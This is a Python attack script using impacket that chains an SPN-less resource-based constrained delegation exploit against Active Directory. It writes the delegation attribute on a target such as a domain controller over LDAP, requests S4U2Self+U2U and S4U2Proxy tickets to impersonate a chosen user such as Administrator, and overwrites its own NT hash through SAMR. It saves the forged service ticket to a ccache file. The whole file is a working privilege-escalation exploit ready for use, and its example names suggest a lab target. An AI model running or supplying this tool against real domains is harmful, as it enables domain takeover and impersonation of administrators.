#!/usr/bin/env python3

import argparse
import datetime
import logging
import random
import struct
import sys

import ldap3
import ldapdomaindump
from binascii import hexlify
from ldap3.protocol.formatters.formatters import format_sid
from ldap3.utils.conv import escape_filter_chars
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from six import ensure_binary

from impacket.examples import logger
from impacket.examples.utils import init_ldap_session, parse_identity
from impacket.dcerpc.v5 import samr, transport
from impacket.krb5 import constants
from impacket.krb5.asn1 import (
    AP_REQ,
    AS_REP,
    Authenticator,
    PA_FOR_USER_ENC,
    PA_PAC_OPTIONS,
    TGS_REP,
    TGS_REQ,
    Ticket as TicketAsn1,
    seq_set,
    seq_set_iter,
)
from impacket.krb5.ccache import CCache
from impacket.krb5.crypto import _HMACMD5
from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
from impacket.krb5.types import KerberosTime, Principal, Ticket
from impacket.ldap import ldaptypes
from impacket.ntlm import compute_nthash


def create_empty_sd():
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
    sd["Revision"] = b"\x01"
    sd["Sbz1"] = b"\x00"
    sd["Control"] = 32772
    sd["OwnerSid"] = ldaptypes.LDAP_SID()
    sd["OwnerSid"].fromCanonical("S-1-5-32-544")
    sd["GroupSid"] = b""
    sd["Sacl"] = b""
    acl = ldaptypes.ACL()
    acl["AclRevision"] = 4
    acl["Sbz1"] = 0
    acl["Sbz2"] = 0
    acl.aces = []
    sd["Dacl"] = acl
    return sd


def create_allow_ace(sid):
    ace = ldaptypes.ACE()
    ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
    ace["AceFlags"] = 0x00
    ace_data = ldaptypes.ACCESS_ALLOWED_ACE()
    ace_data["Mask"] = ldaptypes.ACCESS_MASK()
    ace_data["Mask"]["Mask"] = 983551
    ace_data["Sid"] = ldaptypes.LDAP_SID()
    ace_data["Sid"].fromCanonical(sid)
    ace["Ace"] = ace_data
    return ace


class RBCDWriter:
    def __init__(self, ldap_server, ldap_session):
        self.ldap_server = ldap_server
        self.ldap_session = ldap_session
        config = ldapdomaindump.domainDumpConfig()
        config.basepath = None
        self.domain_dumper = ldapdomaindump.domainDumper(ldap_server, ldap_session, config)

    def get_account_info(self, sam_name):
        query = "(sAMAccountName=%s)" % escape_filter_chars(sam_name)
        self.ldap_session.search(self.domain_dumper.root, query, attributes=["objectSid"])
        if not self.ldap_session.entries:
            raise RuntimeError("LDAP account not found: %s" % sam_name)
        entry = self.ldap_session.entries[0]
        return entry.entry_dn, format_sid(entry["objectSid"].raw_values[0])

    def read_sd(self, target_dn):
        self.ldap_session.search(
            target_dn,
            "(objectClass=*)",
            search_scope=ldap3.BASE,
            attributes=["msDS-AllowedToActOnBehalfOfOtherIdentity"],
        )
        entries = [e for e in self.ldap_session.response if e["type"] == "searchResEntry"]
        if not entries:
            raise RuntimeError("Could not query target object")
        raw_values = entries[0]["raw_attributes"]["msDS-AllowedToActOnBehalfOfOtherIdentity"]
        if not raw_values:
            return create_empty_sd(), entries[0]
        return ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw_values[0]), entries[0]

    def write(self, delegate_from, delegate_to):
        _, from_sid = self.get_account_info(delegate_from)
        to_dn, _ = self.get_account_info(delegate_to)
        sd, target = self.read_sd(to_dn)

        existing = [ace["Ace"]["Sid"].formatCanonical() for ace in sd["Dacl"].aces]
        if from_sid in existing:
            logging.info("%s is already allowed to act on %s", delegate_from, delegate_to)
            return

        sd["Dacl"].aces.append(create_allow_ace(from_sid))
        self.ldap_session.modify(
            target["dn"],
            {"msDS-AllowedToActOnBehalfOfOtherIdentity": [ldap3.MODIFY_REPLACE, [sd.getData()]]},
        )
        if self.ldap_session.result["result"] != 0:
            raise RuntimeError("LDAP modify failed: %s" % self.ldap_session.result["message"])
        logging.info("RBCD written: %s can impersonate users to %s", delegate_from, delegate_to)


class SAMRHashChanger:
    def __init__(self, address, domain, username, password, lmhash, nthash):
        self.address = address
        self.domain = domain
        self.username = username
        self.password = password
        self.lmhash = lmhash or ""
        self.nthash = nthash or ""

    def change_own_nt_hash(self, new_nthash_hex):
        if not self.nthash:
            self.nthash = hexlify(compute_nthash(self.password)).decode()

        binding = r"ncacn_np:%s[\pipe\samr]" % self.address
        rpc_transport = transport.DCERPCTransportFactory(binding)
        rpc_transport.setRemoteHost(self.address)
        rpc_transport.set_credentials(self.username, self.password, self.domain, self.lmhash, self.nthash)

        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)

        server_handle = samr.hSamrConnect(dce, self.address + "\x00")["ServerHandle"]
        domain_sid = samr.hSamrLookupDomainInSamServer(dce, server_handle, self.domain)["DomainId"]
        domain_handle = samr.hSamrOpenDomain(dce, server_handle, domainId=domain_sid)["DomainHandle"]
        rid = samr.hSamrLookupNamesInDomain(dce, domain_handle, (self.username,))["RelativeIds"]["Element"][0]
        user_handle = samr.hSamrOpenUser(dce, domain_handle, userId=rid)["UserHandle"]
        response = samr.hSamrChangePasswordUser(
            dce,
            user_handle,
            oldPassword="",
            newPassword="",
            oldPwdHashNT=self.nthash,
            newPwdHashLM="",
            newPwdHashNT=new_nthash_hex,
        )
        if response["ErrorCode"] != 0:
            raise RuntimeError("SAMR password hash change returned %s" % response["ErrorCode"])
        logging.info("Changed %s NT hash to TGT session key via SAMR", self.username)


class SPNLessRBCD:
    def __init__(self, domain, username, password, lmhash, nthash, dc_ip, impersonate, spn, output):
        self.domain = domain.upper()
        self.username = username
        self.password = password
        self.lmhash = lmhash or ""
        self.nthash = nthash or ""
        self.dc_ip = dc_ip
        self.impersonate = impersonate
        self.spn = spn
        self.output = output

    def get_tgt(self):
        user = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        tgt, cipher, old_session_key, session_key = getKerberosTGT(
            user,
            self.password,
            self.domain,
            self.lmhash,
            self.nthash,
            "",
            self.dc_ip,
        )
        logging.info("Got TGT for %s", self.username)
        return tgt, cipher, old_session_key, session_key

    def s4u2self_u2u(self, tgt, cipher, session_key):
        decoded_tgt = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        tgt_ticket = Ticket()
        tgt_ticket.from_asn1(decoded_tgt["ticket"])

        ap_req = self._build_ap_req(decoded_tgt, tgt_ticket, cipher, session_key)

        tgs_req = TGS_REQ()
        tgs_req["pvno"] = 5
        tgs_req["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgs_req["padata"] = noValue
        tgs_req["padata"][0] = noValue
        tgs_req["padata"][0]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgs_req["padata"][0]["padata-value"] = encoder.encode(ap_req)

        client_name = Principal(self.impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        s4u_bytes = struct.pack("<I", constants.PrincipalNameType.NT_PRINCIPAL.value)
        s4u_bytes += ensure_binary(self.impersonate) + ensure_binary(self.domain) + b"Kerberos"
        checksum = _HMACMD5.checksum(session_key, 17, s4u_bytes)

        pa_for_user = PA_FOR_USER_ENC()
        seq_set(pa_for_user, "userName", client_name.components_to_asn1)
        pa_for_user["userRealm"] = self.domain
        pa_for_user["cksum"] = noValue
        pa_for_user["cksum"]["cksumtype"] = int(constants.ChecksumTypes.hmac_md5.value)
        pa_for_user["cksum"]["checksum"] = checksum
        pa_for_user["auth-package"] = "Kerberos"

        tgs_req["padata"][1] = noValue
        tgs_req["padata"][1]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
        tgs_req["padata"][1]["padata-value"] = encoder.encode(pa_for_user)

        req_body = seq_set(tgs_req, "req-body")
        opts = [
            constants.KDCOptions.forwardable.value,
            constants.KDCOptions.renewable.value,
            constants.KDCOptions.canonicalize.value,
            constants.KDCOptions.renewable_ok.value,
            constants.KDCOptions.enc_tkt_in_skey.value,
        ]
        req_body["kdc-options"] = constants.encodeFlags(opts)
        server_name = Principal(self.username, self.domain, type=constants.PrincipalNameType.NT_UNKNOWN.value)
        seq_set(req_body, "sname", server_name.components_to_asn1)
        req_body["realm"] = str(decoded_tgt["crealm"])
        req_body["till"] = KerberosTime.to_asn1(datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1))
        req_body["nonce"] = random.getrandbits(31)
        seq_set_iter(req_body, "etype", (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))
        seq_set_iter(req_body, "additional-tickets", (tgt_ticket.to_asn1(TicketAsn1()),))

        logging.info("Requesting S4U2Self+U2U as %s", self.impersonate)
        response = sendReceive(encoder.encode(tgs_req), self.domain, self.dc_ip)
        tgs = decoder.decode(response, asn1Spec=TGS_REP())[0]
        logging.info("Got U2U evidence ticket etype %s", int(tgs["ticket"]["enc-part"]["etype"]))
        return tgs

    def s4u2proxy(self, tgt, evidence_tgs, cipher, session_key):
        decoded_tgt = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        tgt_ticket = Ticket()
        tgt_ticket.from_asn1(decoded_tgt["ticket"])

        evidence_ticket = Ticket()
        evidence_ticket.from_asn1(evidence_tgs["ticket"])
        ap_req = self._build_ap_req(decoded_tgt, tgt_ticket, cipher, session_key)

        tgs_req = TGS_REQ()
        tgs_req["pvno"] = 5
        tgs_req["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgs_req["padata"] = noValue
        tgs_req["padata"][0] = noValue
        tgs_req["padata"][0]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgs_req["padata"][0]["padata-value"] = encoder.encode(ap_req)

        pa_pac_options = PA_PAC_OPTIONS()
        pa_pac_options["flags"] = constants.encodeFlags(
            (constants.PAPacOptions.resource_based_constrained_delegation.value,)
        )
        tgs_req["padata"][1] = noValue
        tgs_req["padata"][1]["padata-type"] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
        tgs_req["padata"][1]["padata-value"] = encoder.encode(pa_pac_options)

        req_body = seq_set(tgs_req, "req-body")
        opts = [
            constants.KDCOptions.cname_in_addl_tkt.value,
            constants.KDCOptions.canonicalize.value,
            constants.KDCOptions.forwardable.value,
            constants.KDCOptions.renewable.value,
        ]
        req_body["kdc-options"] = constants.encodeFlags(opts)
        target_service = Principal(self.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
        seq_set(req_body, "sname", target_service.components_to_asn1)
        req_body["realm"] = self.domain
        req_body["till"] = KerberosTime.to_asn1(datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1))
        req_body["nonce"] = random.getrandbits(31)
        seq_set_iter(
            req_body,
            "etype",
            (
                int(constants.EncryptionTypes.rc4_hmac.value),
                int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
                int(cipher.enctype),
            ),
        )
        seq_set_iter(req_body, "additional-tickets", (evidence_ticket.to_asn1(TicketAsn1()),))

        logging.info("Requesting S4U2Proxy for %s", self.spn)
        return sendReceive(encoder.encode(tgs_req), self.domain, self.dc_ip)

    def _build_ap_req(self, decoded_tgt, ticket, cipher, session_key):
        ap_req = AP_REQ()
        ap_req["pvno"] = 5
        ap_req["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)
        ap_req["ap-options"] = constants.encodeFlags([])
        seq_set(ap_req, "ticket", ticket.to_asn1)

        authenticator = Authenticator()
        authenticator["authenticator-vno"] = 5
        authenticator["crealm"] = str(decoded_tgt["crealm"])
        client_name = Principal()
        client_name.from_asn1(decoded_tgt, "crealm", "cname")
        seq_set(authenticator, "cname", client_name.components_to_asn1)
        now = datetime.datetime.now(datetime.timezone.utc)
        authenticator["cusec"] = now.microsecond
        authenticator["ctime"] = KerberosTime.to_asn1(now)

        encrypted = cipher.encrypt(session_key, 7, encoder.encode(authenticator), None)
        ap_req["authenticator"] = noValue
        ap_req["authenticator"]["etype"] = cipher.enctype
        ap_req["authenticator"]["cipher"] = encrypted
        return ap_req

    def save_ccache(self, tgs_response, session_key):
        ccache = CCache()
        ccache.fromTGS(tgs_response, session_key, session_key)
        filename = self.output or ("%s.ccache" % self.impersonate)
        ccache.saveFile(filename)
        logging.info("Saved ticket to %s", filename)
        return filename

    def run(self):
        tgt, cipher, _, session_key = self.get_tgt()
        evidence = self.s4u2self_u2u(tgt, cipher, session_key)
        if int(evidence["ticket"]["enc-part"]["etype"]) != int(constants.EncryptionTypes.rc4_hmac.value):
            raise RuntimeError("SPN-less hash pivot needs RC4 U2U evidence; got etype %s" %
                               int(evidence["ticket"]["enc-part"]["etype"]))
        SAMRHashChanger(
            self.dc_ip,
            self.domain,
            self.username,
            self.password,
            self.lmhash,
            self.nthash,
        ).change_own_nt_hash(hexlify(session_key.contents).decode())
        st = self.s4u2proxy(tgt, evidence, cipher, session_key)
        return self.save_ccache(st, session_key)


def parse_args():
    parser = argparse.ArgumentParser(
        description="Minimal SPN-less RBCD chain : optionally write RBCD, then S4U2Self U2U + S4U2Proxy."
    )
    parser.add_argument("identity", help="domain/user[:password]")
    parser.add_argument("-delegate-to", required=True, help="Target account whose RBCD attribute is modified, e.g. DC$")
    parser.add_argument("-delegate-from", help="Controlled SPN-less account. Defaults to identity username.")
    parser.add_argument("-impersonate", required=True, help="User to impersonate, e.g. Administrator")
    parser.add_argument("-spn", required=True, help="Target SPN, e.g. cifs/dc.phantom.vl")
    parser.add_argument("-dc-ip", required=True, help="Domain controller / KDC IP")
    parser.add_argument("-dc-host", help="Domain controller hostname for LDAP")
    parser.add_argument("-use-ldaps", action="store_true", help="Use LDAPS for LDAP write")
    parser.add_argument("--no-write", action="store_true", help="Skip RBCD write and only request the ticket")
    parser.add_argument("-o", "--output", help="Output ccache path")
    parser.add_argument("-hashes", metavar="LMHASH:NTHASH", help="NTLM hashes")
    parser.add_argument("-no-pass", action="store_true", help="Do not prompt for password")
    parser.add_argument("-debug", action="store_true", help="Debug output")
    parser.add_argument("-ts", action="store_true", help="Timestamp logs")
    return parser.parse_args()


def main():
    args = parse_args()
    logger.init(args.ts, args.debug)

    domain, username, password, lmhash, nthash, _ = parse_identity(
        args.identity, args.hashes, args.no_pass, None, False
    )
    delegate_from = args.delegate_from or username

    if delegate_from.lower() != username.lower():
        logging.error("-delegate-from must match the authenticated user for the SPN-less chain")
        sys.exit(1)

    try:
        if not args.no_write:
            logging.info("Connecting to LDAP to write RBCD")
            ldap_server, ldap_session = init_ldap_session(
                domain,
                username,
                password,
                lmhash,
                nthash,
                False,
                args.dc_ip,
                args.dc_host,
                None,
                args.use_ldaps,
            )
            RBCDWriter(ldap_server, ldap_session).write(delegate_from, args.delegate_to)

        tool = SPNLessRBCD(
            domain,
            delegate_from,
            password,
            lmhash,
            nthash,
            args.dc_ip,
            args.impersonate,
            args.spn,
            args.output,
        )
        tool.run()
    except Exception as exc:
        if args.debug:
            raise
        logging.error("%s", exc)
        sys.exit(1)


if __name__ == "__main__":
    main()
